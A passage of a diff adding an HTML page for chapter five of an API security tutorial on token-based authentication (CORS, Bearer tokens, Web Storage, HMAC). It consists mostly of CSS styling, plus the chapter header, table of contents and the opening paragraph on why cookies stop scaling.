@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Modern Token-Based Authentication — API Security in Action</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,600;0,9..144,900;1,9..144,500&family=Spline+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#15140f; --ink-soft:#403c33; --paper:#f4efe4; --paper-2:#ece4d3;
+    --card:#fbf8f0; --line:#d9cfb8; --rule:#c7bca0;
+    --accent:#b5471f; --accent-2:#1d6b5a; --gold:#c08a2e; --shield:#2f4858; --plum:#7a4ba3; --warn:#9a3b12;
+    --shadow:0 1px 0 rgba(0,0,0,.04), 0 8px 28px -12px rgba(40,30,10,.35);
+    --mono:'JetBrains Mono',monospace; --serif:'Fraunces',Georgia,serif; --sans:'Spline Sans',system-ui,sans-serif;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{
+    margin:0;
+    background:
+      radial-gradient(1200px 600px at 80% -5%, rgba(181,71,31,.07), transparent 60%),
+      radial-gradient(900px 500px at -10% 20%, rgba(29,107,90,.06), transparent 55%),
+      var(--paper);
+    color:var(--ink); font-family:var(--sans); font-size:18px; line-height:1.72; -webkit-font-smoothing:antialiased;
+  }
+  body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;opacity:.5;
+    background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='2'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.035'/%3E%3C/svg%3E");}
+  .wrap{position:relative;z-index:1;max-width:880px;margin:0 auto;padding:0 26px}
+
+  .ribbon{max-width:880px;margin:0 auto;padding:18px 26px 0;display:flex;justify-content:space-between;align-items:center;
+    font-family:var(--mono);font-size:12px;letter-spacing:.18em;text-transform:uppercase;color:var(--ink-soft)}
+  .ribbon .dot{width:8px;height:8px;border-radius:50%;background:var(--accent);display:inline-block;margin-right:8px;vertical-align:middle}
+
+  header.hero{max-width:880px;margin:0 auto;padding:34px 26px 18px;position:relative}
+  .kicker{font-family:var(--mono);font-size:12.5px;letter-spacing:.3em;text-transform:uppercase;color:var(--accent);margin-bottom:18px;display:flex;align-items:center;gap:12px}
+  .kicker::after{content:"";flex:1;height:1px;background:linear-gradient(90deg,var(--rule),transparent)}
+  h1.title{font-family:var(--serif);font-weight:900;font-size:clamp(40px,8vw,76px);line-height:.98;letter-spacing:-.02em;margin:0 0 8px;color:var(--ink)}
+  h1.title em{font-style:italic;color:var(--accent);font-weight:500}
+  .sub{font-family:var(--serif);font-style:italic;font-size:clamp(19px,3vw,24px);color:var(--ink-soft);max-width:60ch;margin:14px 0 0;font-weight:400}
+  .meta-row{display:flex;flex-wrap:wrap;gap:10px;margin-top:26px}
+  .chip{font-family:var(--mono);font-size:11.5px;letter-spacing:.08em;text-transform:uppercase;background:var(--card);border:1px solid var(--line);border-radius:100px;padding:7px 14px;color:var(--ink-soft);box-shadow:var(--shadow)}
+
+  nav.toc{margin:36px auto 0;background:var(--card);border:1px solid var(--line);border-radius:18px;padding:26px 30px;box-shadow:var(--shadow)}
+  nav.toc h4{font-family:var(--mono);font-size:12px;letter-spacing:.2em;text-transform:uppercase;color:var(--accent);margin:0 0 16px}
+  nav.toc ol{margin:0;padding:0;list-style:none;counter-reset:toc;display:grid;grid-template-columns:1fr 1fr;gap:4px 30px}
+  nav.toc li{counter-increment:toc;border-bottom:1px dotted var(--rule)}
+  nav.toc a{display:flex;align-items:baseline;gap:12px;text-decoration:none;color:var(--ink);padding:9px 0;font-size:16px;transition:color .2s,padding .2s}
+  nav.toc a::before{content:counter(toc,decimal-leading-zero);font-family:var(--mono);font-size:12px;color:var(--accent);flex:none}
+  nav.toc a:hover{color:var(--accent);padding-left:6px}
+  @media(max-width:640px){nav.toc ol{grid-template-columns:1fr}}
+
+  section{margin:64px auto 0}
+  .sec-head{display:flex;align-items:flex-start;gap:18px;margin-bottom:8px}
+  .sec-num{font-family:var(--serif);font-weight:900;font-size:54px;line-height:.8;color:var(--accent);flex:none;margin-top:4px}
+  h2{font-family:var(--serif);font-weight:600;font-size:clamp(28px,5vw,38px);line-height:1.05;letter-spacing:-.015em;margin:0;color:var(--ink)}
+  h2 em{font-style:italic;color:var(--accent);font-weight:500}
+  h3{font-family:var(--serif);font-weight:600;font-size:24px;letter-spacing:-.01em;margin:38px 0 6px;color:var(--ink)}
+  h3 .tag{font-family:var(--mono);font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--accent-2);vertical-align:middle;margin-left:10px;border:1px solid var(--accent-2);padding:2px 8px;border-radius:6px}
+  p{margin:16px 0}
+  .lead{font-size:20px;color:var(--ink-soft)}
+  strong{font-weight:700;color:var(--ink)}
+  em.term{font-style:normal;font-weight:600;color:var(--accent);border-bottom:2px solid rgba(181,71,31,.25)}
+  hr.rule{border:none;height:1px;background:linear-gradient(90deg,transparent,var(--rule),transparent);margin:54px 0}
+
+  .callout{border-radius:14px;padding:20px 22px 20px 54px;margin:26px 0;position:relative;background:var(--card);border:1px solid var(--line);box-shadow:var(--shadow);font-size:16.5px}
+  .callout .ic{position:absolute;left:18px;top:20px;width:24px;height:24px}
+  .callout .lab{font-family:var(--mono);font-size:11px;letter-spacing:.16em;text-transform:uppercase;display:block;margin-bottom:4px}
+  .callout.def{border-left:4px solid var(--accent-2)} .callout.def .lab{color:var(--accent-2)}
+  .callout.eg{border-left:4px solid var(--gold);background:linear-gradient(180deg,#fdf8ea,var(--card))} .callout.eg .lab{color:var(--gold)}
+  .callout.real{border-left:4px solid var(--accent);background:linear-gradient(180deg,#fbf0ea,var(--card))} .callout.real .lab{color:var(--accent)}
+  .callout.tip{border-left:4px solid var(--shield)} .callout.tip .lab{color:var(--shield)}
+  .callout p{margin:6px 0} .callout p:first-of-type{margin-top:0}
+
+  .analogy{background:linear-gradient(135deg,#2f4858,#23363f);color:#f0e9d8;border-radius:18px;padding:30px 32px;margin:30px 0;position:relative;overflow:hidden;box-shadow:0 20px 40px -22px rgba(20,30,40,.7)}
+  .analogy::after{content:"\201C";position:absolute;right:18px;top:-20px;font-family:var(--serif);font-size:160px;color:rgba(255,255,255,.06);font-weight:900}
+  .analogy .lab{font-family:var(--mono);font-size:11px;letter-spacing:.2em;text-transform:uppercase;color:var(--gold);display:block;margin-bottom:10px}
+  .analogy p{margin:8px 0;color:#ece4d3} .analogy strong{color:#fff}
+
+  .grid{display:grid;gap:16px;margin:26px 0}
+  .grid.c3{grid-template-columns:repeat(3,1fr)} .grid.c2{grid-template-columns:repeat(2,1fr)}
+  @media(max-width:680px){.grid.c3,.grid.c2{grid-template-columns:1fr}}
+  .mini{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:18px;box-shadow:var(--shadow);position:relative;overflow:hidden}
+  .mini .n{font-family:var(--serif);font-weight:900;font-size:30px;color:var(--accent);line-height:1}
+  .mini h5{font-family:var(--sans);font-weight:700;font-size:17px;margin:8px 0 4px;color:var(--ink)}
+  .mini p{font-size:14.5px;margin:0;color:var(--ink-soft);line-height:1.55}
+
+  .cia{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin:24px 0}
+  .cia .c{border-radius:14px;padding:20px;color:#fff;position:relative;overflow:hidden;box-shadow:var(--shadow)}
+  .cia .c .l{font-family:var(--serif);font-weight:900;font-size:42px;opacity:.25;position:absolute;right:14px;top:6px}
+  .cia .c h5{margin:0 0 4px;font-size:18px;font-weight:700} .cia .c p{margin:0;font-size:14px;opacity:.95;line-height:1.5}
+  .cia .conf{background:linear-gradient(135deg,#b5471f,#8a3416)} .cia .integ{background:linear-gradient(135deg,#1d6b5a,#13473c)} .cia .avail{background:linear-gradient(135deg,#c08a2e,#8f6418)}
+  @media(max-width:680px){.cia{grid-template-columns:1fr}}
+
+  .stride{margin:24px 0;border-radius:14px;overflow:hidden;border:1px solid var(--line);box-shadow:var(--shadow)}
+  .stride .row{display:grid;grid-template-columns:64px 1fr;align-items:center;border-bottom:1px solid var(--line);background:var(--card)}
+  .stride .row:last-child{border-bottom:none}
+  .stride .let{font-family:var(--serif);font-weight:900;font-size:30px;color:#fff;height:100%;display:flex;align-items:center;justify-content:center;padding:16px 0}
+  .stride .row:nth-child(1) .let{background:#b5471f} .stride .row:nth-child(2) .let{background:#1d6b5a} .stride .row:nth-child(3) .let{background:#c08a2e}
+  .stride .row:nth-child(4) .let{background:#7a4ba3} .stride .row:nth-child(5) .let{background:#2f4858} .stride .row:nth-child(6) .let{background:#9a3b12}
+  .stride .txt{padding:12px 18px} .stride .txt b{font-weight:700} .stride .txt span{display:block;font-size:14.5px;color:var(--ink-soft)}
+
+  .quiz{background:#fff7e6;border:1px dashed var(--gold);border-radius:16px;padding:24px 26px;margin:30px 0}
+  .quiz .lab{font-family:var(--mono);font-size:11px;letter-spacing:.2em;text-transform:uppercase;color:var(--gold);display:block;margin-bottom:12px}
+  .quiz details{border-top:1px solid #e8d9b0;padding:12px 0} .quiz details:first-of-type{border-top:none}
+  .quiz summary{cursor:pointer;font-weight:600;list-style:none;display:flex;gap:10px;align-items:flex-start}
+  .quiz summary::-webkit-details-marker{display:none}
+  .quiz summary::before{content:"?";font-family:var(--mono);background:var(--gold);color:#fff;width:22px;height:22px;border-radius:6px;display:inline-flex;align-items:center;justify-content:center;font-size:13px;flex:none;margin-top:2px}
+  .quiz details[open] summary::before{content:"\2713";background:var(--accent-2)}
+  .quiz .ans{margin:10px 0 0 32px;font-size:15.5px;color:var(--ink-soft)}
+
+  .takeaways{background:var(--ink);color:var(--paper);border-radius:20px;padding:32px 34px;margin:50px 0}
+  .takeaways h3{color:var(--gold);margin-top:0}
+  .takeaways ul{margin:14px 0 0;padding:0;list-style:none}
+  .takeaways li{padding:11px 0 11px 32px;position:relative;border-bottom:1px solid rgba(255,255,255,.1);font-size:16px}
+  .takeaways li:last-child{border-bottom:none}
+  .takeaways li::before{content:"\2192";position:absolute;left:0;color:var(--accent);font-weight:700}
+  .takeaways strong{color:#fff}
+
+  footer{max-width:880px;margin:60px auto 40px;padding:30px 26px;border-top:1px solid var(--rule);font-family:var(--mono);font-size:12.5px;color:var(--ink-soft);letter-spacing:.04em;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px}
+  code{font-family:var(--mono);font-size:.86em;background:var(--paper-2);border:1px solid var(--line);padding:1px 6px;border-radius:6px;color:var(--accent-2)}
+  .pull{font-family:var(--serif);font-style:italic;font-size:clamp(22px,4vw,30px);line-height:1.3;color:var(--ink);border-left:4px solid var(--accent);padding:6px 0 6px 24px;margin:40px 0}
+  .pull span{color:var(--accent)}
+  ::selection{background:var(--accent);color:#fff}
+
+  /* ============ INTERACTIVE DIAGRAM SYSTEM ============ */
+  .diagram{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:24px 24px 18px;margin:30px 0;box-shadow:var(--shadow);position:relative}
+  .diagram .dlabel{font-family:var(--mono);font-size:11px;letter-spacing:.18em;text-transform:uppercase;color:var(--accent);display:flex;align-items:center;gap:8px;margin-bottom:4px}
+  .diagram .dtitle{font-family:var(--serif);font-size:21px;font-weight:600;color:var(--ink);margin:0 0 4px}
+  .diagram .dhint{font-size:13.5px;color:var(--ink-soft);font-style:italic;margin:0 0 18px}
+  .diagram .dhint b{color:var(--accent);font-style:normal;font-weight:600}
+
+  .node{background:#fff;border:2px solid var(--ink);border-radius:12px;position:relative;transition:transform .25s cubic-bezier(.2,.8,.2,1),box-shadow .25s,border-color .25s}
+  .node:hover{transform:translateY(-3px);box-shadow:0 14px 28px -14px rgba(40,30,10,.5)}
+
+  @keyframes floatPkt{0%{transform:translateX(0);opacity:0}8%{opacity:1}92%{opacity:1}100%{transform:translateX(var(--travel,200px));opacity:0}}
+
+  .stepper{display:flex;flex-wrap:wrap;gap:8px;margin:18px 0 4px;align-items:center}
+  .stepper button{font-family:var(--mono);font-size:12px;letter-spacing:.04em;border:1.5px solid var(--line);background:var(--card);color:var(--ink-soft);
+    padding:8px 14px;border-radius:100px;cursor:pointer;transition:all .2s}
+  .stepper button:hover{border-color:var(--accent);color:var(--accent)}
+  .stepper button.active{background:var(--accent);border-color:var(--accent);color:#fff;box-shadow:0 6px 14px -6px var(--accent)}
+  .step-readout{background:var(--paper-2);border:1px solid var(--line);border-radius:12px;padding:14px 16px;margin-top:14px;font-size:15px;min-height:54px;color:var(--ink)}
+  .step-readout b{color:var(--accent)}
+
+  .legend{display:flex;flex-wrap:wrap;gap:14px;margin-top:16px;padding-top:14px;border-top:1px dashed var(--rule);font-family:var(--mono);font-size:11.5px;color:var(--ink-soft)}
+  .legend .k{display:flex;align-items:center;gap:6px}
+  .legend .sw{width:16px;height:10px;border-radius:3px;display:inline-block}
+  .legend .sw.dash{background:none;border:2px dashed var(--accent);height:6px}
+
+  .dexplain{background:var(--paper-2);border:1px solid var(--line);border-left:4px solid var(--accent-2);border-radius:0 12px 12px 0;padding:18px 22px;margin:6px 0 30px;font-size:15.5px}
+  .dexplain h4{font-family:var(--mono);font-size:11px;letter-spacing:.16em;text-transform:uppercase;color:var(--accent-2);margin:0 0 10px}
+  .dexplain ol{margin:8px 0 0;padding-left:20px} .dexplain li{margin:7px 0;padding-left:4px}
+  .dexplain b{color:var(--ink)}
+
+  .stage{flex:1;min-width:0;text-align:center;padding:16px 8px;border-radius:12px;border:2px solid var(--ink);background:#fff;
+    font-weight:600;font-size:14px;position:relative;transition:all .25s;cursor:pointer}
+  .stage small{display:block;font-family:var(--mono);font-size:9.5px;letter-spacing:.05em;color:var(--ink-soft);margin-top:4px;font-weight:400}
+  .stage:hover{transform:translateY(-3px)}
+  .stage.dim{opacity:.35;filter:grayscale(.4)}
+  .stage.on{box-shadow:0 0 0 4px rgba(181,71,31,.18);border-color:var(--accent)}
+
+  @media(max-width:680px){.diagram{padding:18px 14px}}
+
+  /* ===== Chapter 2 additions ===== */
+  /* code blocks */
+  .code{background:#1c1a16;border-radius:14px;margin:24px 0;box-shadow:var(--shadow);overflow:hidden;border:1px solid #2c2922}
+  .code .bar{display:flex;align-items:center;gap:7px;padding:11px 16px;background:#23201a;border-bottom:1px solid #2c2922}
+  .code .bar .dot{width:11px;height:11px;border-radius:50%}
+  .code .bar .t{margin-left:8px;font-family:var(--mono);font-size:11.5px;color:#9a9484;letter-spacing:.04em}
+  .code pre{margin:0;padding:18px 20px;overflow-x:auto;font-family:var(--mono);font-size:13.5px;line-height:1.7;color:#e8e2d4}
+  .code .cm{color:#7c8a6b;font-style:italic}      /* comment */
+  .code .kw{color:#e0995e}                          /* keyword */
+  .code .st{color:#9ec88a}                          /* string */
+  .code .fn{color:#6fb3c9}                          /* function/type */
+  .code .nm{color:#d98b7a}                          /* number */
+  .code .bad{color:#ff8a7a;background:rgba(255,80,60,.13);border-radius:3px;padding:0 2px}
+  .code .good{color:#9ee6a8;background:rgba(60,200,90,.12);border-radius:3px;padding:0 2px}
+  .codecap{font-family:var(--mono);font-size:12px;color:var(--ink-soft);margin:-14px 0 26px;padding-left:4px}
+  .codecap b{color:var(--accent)}
+
+  /* danger / attack callout */
+  .callout.danger{border-left:4px solid #b5471f;background:linear-gradient(180deg,#fbe9e3,var(--card))} .callout.danger .lab{color:#b5471f}
+  .callout.principle{border-left:4px solid var(--plum);background:linear-gradient(180deg,#f3ecf7,var(--card))} .callout.principle .lab{color:var(--plum)}
+
+  /* OWASP list */
+  .owasp{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:24px 0}
+  @media(max-width:680px){.owasp{grid-template-columns:1fr}}
+  .owasp .col h5{font-family:var(--mono);font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin:0 0 8px}
+  .owasp .it{display:flex;gap:8px;align-items:baseline;font-size:13.5px;padding:5px 0;border-bottom:1px dotted var(--rule);color:var(--ink-soft)}
+  .owasp .it b{font-family:var(--mono);font-size:11px;color:var(--accent);flex:none}
+  .owasp .it.hot b{color:#b5471f} .owasp .it.hot{font-weight:600;color:var(--ink)}
+
+  /* token stream for SQLi anatomy */
+  .tok{display:inline-block;padding:3px 7px;border-radius:6px;font-family:var(--mono);font-size:12.5px;margin:2px;border:1px solid transparent;white-space:nowrap}
+  .tok.sql{background:#e7e0cf;color:#3a352a;border-color:#d2c8b0}
+  .tok.inj{background:#fbe0d6;color:#9a3b12;border-color:#e8b9a8;font-weight:700}
+  .tok.cmt{background:#dfe9df;color:#3c5c3c;border-color:#c2d6c2}
+
+  /* security header table */
+  .hdrtbl{margin:24px 0;border:1px solid var(--line);border-radius:14px;overflow:hidden;box-shadow:var(--shadow)}
+  .hdrtbl .hrow{display:grid;grid-template-columns:minmax(140px,1fr) 1.4fr;gap:0;border-bottom:1px solid var(--line)}
+  .hdrtbl .hrow:last-child{border-bottom:none}
+  .hdrtbl .hrow:nth-child(even){background:#f7f1e3}
+  .hdrtbl .hk{padding:13px 16px;font-family:var(--mono);font-size:12.5px;color:var(--accent-2);font-weight:500;border-right:1px solid var(--line);word-break:break-word}
+  .hdrtbl .hv{padding:13px 16px;font-size:14px;color:var(--ink-soft)}
+  .hdrtbl .hhead{background:var(--ink)!important;color:var(--paper)}
+  .hdrtbl .hhead .hk,.hdrtbl .hhead .hv{color:var(--paper);font-family:var(--mono);font-size:11px;letter-spacing:.1em;text-transform:uppercase;border-color:#333}
+
+
+  /* ===== Chapter 3 additions ===== */
+  /* the 5-control pipeline lab */
+  .pipelab{display:flex;gap:6px;align-items:stretch;flex-wrap:nowrap;overflow-x:auto;padding:6px 2px 10px}
+  .pipelab .pstage{flex:1;min-width:96px;text-align:center;padding:14px 8px;border-radius:12px;border:2px solid var(--ink);background:#fff;cursor:pointer;transition:all .25s;position:relative}
+  .pipelab .pstage .ico{font-size:20px;line-height:1}
+  .pipelab .pstage .nm{font-weight:700;font-size:12.5px;margin-top:5px}
+  .pipelab .pstage .st{display:block;font-family:var(--mono);font-size:8.5px;letter-spacing:.04em;color:var(--ink-soft);margin-top:3px}
+  .pipelab .pstage:hover{transform:translateY(-3px)}
+  .pipelab .pstage.dim{opacity:.32;filter:grayscale(.4)}
+  .pipelab .pstage.on{box-shadow:0 0 0 4px rgba(181,71,31,.18);border-color:var(--accent)}
+  .pipelab .pstage.reject{border-color:#b5471f;background:linear-gradient(180deg,#fbe9e3,#fff)}
+  .pipelab .arrow{display:flex;align-items:center;color:var(--ink-soft);font-size:15px;flex:none}
+  .pipelab .pstage.logic{flex:1.4;border-color:var(--shield);background:var(--paper-2)}
+
+  /* STRIDE → control mapping */
+  .map{display:grid;grid-template-columns:1fr;gap:8px;margin:22px 0}
+  .map .mrow{display:grid;grid-template-columns:minmax(150px,200px) 28px 1fr;align-items:center;gap:10px;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:10px 14px;box-shadow:var(--shadow)}
+  .map .threat{font-weight:700;font-size:14px}
+  .map .threat small{display:block;font-family:var(--mono);font-size:9px;color:var(--ink-soft);font-weight:400;letter-spacing:.04em}
+  .map .ar{text-align:center;color:var(--accent);font-size:16px}
+  .map .ctrl{font-size:14px;color:var(--ink-soft)} .map .ctrl b{color:var(--accent-2)}
+  .map .mrow.s{border-left:4px solid #b5471f} .map .mrow.t{border-left:4px solid #1d6b5a}
+  .map .mrow.r{border-left:4px solid #c08a2e} .map .mrow.i{border-left:4px solid #7a4ba3}
+  .map .mrow.d{border-left:4px solid #2f4858} .map .mrow.e{border-left:4px solid #9a3b12}
+
+  /* status code compare */
+  .codes{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:24px 0}
+  @media(max-width:680px){.codes{grid-template-columns:1fr}}
+  .codes .cc{border-radius:14px;padding:18px 20px;color:#fff;box-shadow:var(--shadow)}
+  .codes .cc.c401{background:linear-gradient(135deg,#c08a2e,#8f6418)}
+  .codes .cc.c403{background:linear-gradient(135deg,#b5471f,#8a3416)}
+  .codes .cc .num{font-family:var(--serif);font-weight:900;font-size:38px;line-height:1}
+  .codes .cc .ti{font-weight:700;font-size:16px;margin:2px 0 8px} .codes .cc p{margin:0;font-size:14px;opacity:.96;line-height:1.55}
+
+  /* ACL permission chips */
+  .perm{display:inline-flex;gap:3px;font-family:var(--mono);font-size:12px}
+  .perm span{width:22px;height:22px;border-radius:6px;display:inline-flex;align-items:center;justify-content:center;font-weight:700;color:#fff}
+  .perm .r{background:#1d6b5a} .perm .w{background:#c08a2e} .perm .d{background:#b5471f} .perm .off{background:#cfc6b2;color:#fff}
+
+
+  /* ===== Chapter 4 additions ===== */
+  /* origin checker rows */
+  .originlist{display:flex;flex-direction:column;gap:8px;margin:18px 0}
+  .originlist .orow{display:grid;grid-template-columns:1fr auto;align-items:center;gap:12px;background:var(--card);border:1px solid var(--line);border-radius:10px;padding:10px 14px;cursor:pointer;transition:all .2s;box-shadow:var(--shadow)}
+  .originlist .orow:hover{transform:translateX(3px)}
+  .originlist .url{font-family:var(--mono);font-size:12.5px;color:var(--ink);word-break:break-all}
+  .originlist .verdict{font-family:var(--mono);font-size:11px;font-weight:700;padding:4px 10px;border-radius:100px;white-space:nowrap}
+  .originlist .verdict.same{background:#d9efe0;color:#1d6b5a} .originlist .verdict.diff{background:#fbe0d6;color:#b5471f} .originlist .verdict.idle{background:var(--paper-2);color:var(--ink-soft)}
+
+  /* timeline attack steps (stacked) */
+  .tl{display:flex;flex-direction:column;gap:0;margin:8px 0}
+  .tl .tlstep{display:grid;grid-template-columns:34px 1fr;gap:14px;position:relative}
+  .tl .tlstep .dotcol{display:flex;flex-direction:column;align-items:center}
+  .tl .tlstep .num{width:30px;height:30px;border-radius:50%;background:var(--accent);color:#fff;font-family:var(--mono);font-weight:700;font-size:13px;display:flex;align-items:center;justify-content:center;flex:none;z-index:1}
+  .tl .tlstep .line{width:2px;flex:1;background:var(--rule);margin:2px 0}
+  .tl .tlstep:last-child .line{display:none}
+  .tl .tlstep .body{padding-bottom:18px}
+  .tl .tlstep .body h6{margin:4px 0 4px;font-size:15px;font-weight:700;color:var(--ink);font-family:var(--sans)}
+  .tl .tlstep .body p{margin:0;font-size:14px;color:var(--ink-soft);line-height:1.55}
+  .tl .tlstep.evil .num{background:#9a3b12} .tl .tlstep.fix .num{background:#1d6b5a}
+  .tl .tlstep.dimmed{opacity:.3}
+
+  /* cookie attribute cards */
+  .cookieattr{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:22px 0}
+  @media(max-width:680px){.cookieattr{grid-template-columns:1fr}}
+  .cookieattr .ca{background:var(--card);border:1px solid var(--line);border-left:4px solid var(--accent-2);border-radius:0 12px 12px 0;padding:14px 16px;box-shadow:var(--shadow)}
+  .cookieattr .ca code{font-family:var(--mono);font-size:13px;color:var(--accent);background:none;border:none;padding:0;font-weight:700}
+  .cookieattr .ca p{margin:6px 0 0;font-size:13.5px;color:var(--ink-soft);line-height:1.5}
+
+  /* drawback list */
+  .draw{display:flex;flex-direction:column;gap:10px;margin:22px 0}
+  .draw .di{display:grid;grid-template-columns:36px 1fr;gap:12px;align-items:start;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:13px 16px;box-shadow:var(--shadow)}
+  .draw .di .ic2{font-size:20px}
+  .draw .di b{font-weight:700} .draw .di p{margin:3px 0 0;font-size:14px;color:var(--ink-soft);line-height:1.5}
+
+  /* cookie jar visual */
+  .jar{background:#1c1a16;border-radius:12px;padding:14px 16px;font-family:var(--mono);font-size:12.5px;color:#e8e2d4;margin:6px 0;line-height:1.7}
+  .jar .ck{display:flex;gap:8px;align-items:center;padding:4px 0}
+  .jar .ck .nm{color:#6fb3c9}
+  .jar .badge{font-size:9px;padding:1px 6px;border-radius:4px;background:#3a352a;color:#cbb98f}
+  .jar .badge.http{background:#2d4a3a;color:#9ee6a8}
+  .jar .badge.js{background:#4a3a2d;color:#e0995e}
+
+
+  /* ===== Chapter 5 additions ===== */
+  /* three pillars (cookie capabilities) */
+  .pillars{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:22px 0}
+  @media(max-width:680px){.pillars{grid-template-columns:1fr}}
+  .pillars .pil{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px;box-shadow:var(--shadow);text-align:center;position:relative;overflow:hidden}
+  .pillars .pil .ic3{font-size:26px;line-height:1}
+  .pillars .pil h5{margin:8px 0 4px;font-size:15px;font-weight:700}
+  .pillars .pil .sub2{font-family:var(--mono);font-size:9.5px;letter-spacing:.04em;color:var(--accent-2);text-transform:uppercase}
+  .pillars .pil p{margin:8px 0 0;font-size:13px;color:var(--ink-soft);line-height:1.5}
+  .pillars .pil .arrow2{margin-top:10px;font-family:var(--mono);font-size:11px;color:var(--accent);border-top:1px dashed var(--rule);padding-top:8px}
+
+  /* CORS header reference table reuse hdrtbl; add a 'scope' pill */
+  .scopepill{font-family:var(--mono);font-size:9px;padding:2px 7px;border-radius:100px;font-weight:700;letter-spacing:.04em}
+  .scopepill.both{background:#d9efe0;color:#1d6b5a} .scopepill.pre{background:#e7e0f0;color:#7a4ba3} .scopepill.act{background:#fdeecf;color:#8f6418}
+
+  /* layered hardening stack */
+  .stack{display:flex;flex-direction:column;gap:10px;margin:22px 0}
+  .stack .layer{display:grid;grid-template-columns:40px 1fr;gap:14px;align-items:center;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px 16px;box-shadow:var(--shadow);cursor:pointer;transition:all .2s}
+  .stack .layer:hover{transform:translateX(3px)}
+  .stack .layer .lnum{width:34px;height:34px;border-radius:9px;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-weight:700;font-size:14px;color:#fff;flex:none}
+  .stack .layer:nth-child(1) .lnum{background:#2f4858} .stack .layer:nth-child(2) .lnum{background:#1d6b5a}
+  .stack .layer:nth-child(3) .lnum{background:#c08a2e} .stack .layer:nth-child(4) .lnum{background:#b5471f}
+  .stack .layer h5{margin:0;font-size:15px;font-weight:700} .stack .layer p{margin:2px 0 0;font-size:13.5px;color:var(--ink-soft);line-height:1.5}
+  .stack .layer.on{box-shadow:0 0 0 3px rgba(181,71,31,.2)}
+
+  /* threat matrix for db access */
+  .threats3{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:22px 0}
+  @media(max-width:680px){.threats3{grid-template-columns:1fr}}
+  .threats3 .th{border-radius:14px;padding:16px;color:#fff;box-shadow:var(--shadow)}
+  .threats3 .th.read{background:linear-gradient(135deg,#c08a2e,#8f6418)}
+  .threats3 .th.write{background:linear-gradient(135deg,#b5471f,#8a3416)}
+  .threats3 .th.del{background:linear-gradient(135deg,#2f4858,#1c2c34)}
+  .threats3 .th h5{margin:0 0 4px;font-size:15px;font-weight:700} .threats3 .th p{margin:0;font-size:13px;opacity:.95;line-height:1.5}
+
+  /* token anatomy (tokenId.tag) */
+  .tokenviz{background:#1c1a16;border-radius:12px;padding:18px 16px;margin:8px 0;font-family:var(--mono);font-size:13px;text-align:center;overflow-x:auto}
+  .tokenviz .part{display:inline-block;padding:8px 12px;border-radius:8px;margin:3px}
+  .tokenviz .idpart{background:rgba(111,179,201,.18);color:#9cc9d8;border:1px solid #3a5560}
+  .tokenviz .dot{color:#9a9484;font-size:18px;font-weight:700;margin:0 2px}
+  .tokenviz .tagpart{background:rgba(158,230,168,.14);color:#9ee6a8;border:1px solid #3a5540}
+  .tokenviz .lbl{display:block;font-size:9px;color:#9a9484;letter-spacing:.08em;margin-top:6px;text-transform:uppercase}
+
+</style></head>
+<body>
+
+<div class="ribbon">
+  <div><span class="dot"></span>API Security · In Action</div>
+  <div>Chapter 05</div>
+</div>
+
+<header class="hero">
+  <div class="kicker">Chapter Five · Outgrowing Cookies</div>
+  <h1 class="title">Modern Token-Based <em>Authentication</em></h1>
+  <p class="sub">Marketing bought a second domain and we want mobile apps too &mdash; so we relax the same-origin policy with CORS, move tokens out of cookies into Web Storage with the Bearer scheme, then harden the token database with hashing and HMAC.</p>
+  <div class="meta-row">
+    <span class="chip">⏱ ~30 min read</span>
+    <span class="chip">Level · Hands-on</span>
+    <span class="chip">CORS · Bearer · Web Storage · HMAC</span>
+  </div>
+</header>
+
+<div class="wrap">
+
+<nav class="toc">
+  <h4>On this page</h4>
+  <ol>
+    <li><a href="#problem">Why cookies stop scaling</a></li>
+    <li><a href="#cors">Cross-origin requests &amp; CORS</a></li>
+    <li><a href="#preflight">The preflight handshake</a></li>
+    <li><a href="#headers">CORS response headers</a></li>
+    <li><a href="#pillars">What cookies gave us free</a></li>
+    <li><a href="#dbstore">Storing tokens in a database</a></li>
+    <li><a href="#bearer">The Bearer scheme</a></li>
+    <li><a href="#webstorage">Web Storage &amp; its XSS risk</a></li>
+    <li><a href="#harden">Hardening the token database</a></li>
+    <li><a href="#hmac">Authenticating tokens with HMAC</a></li>
+    <li><a href="#takeaways">Key takeaways</a></li>
+    <li><a href="#quiz">Test yourself</a></li>
+  </ol>
+</nav>
+
+<!-- ===================== 1 ===================== -->
+<section id="problem">
+  <div class="sec-head"><span class="sec-num">1</span><div><h2>Why cookies stop scaling</h2></div></div>
+  <p class="lead">In chapter 4 we made session cookies safe with SameSite and CSRF defences, and Natter felt great. But success brings new demands. Marketing has bought a flashy new domain, <code>nat.tr</code>, and wants logins to work across both it and the original site. Meanwhile the product is expanding to mobile and desktop apps. Both ambitions run straight into the wall that cookies build.</p>
+
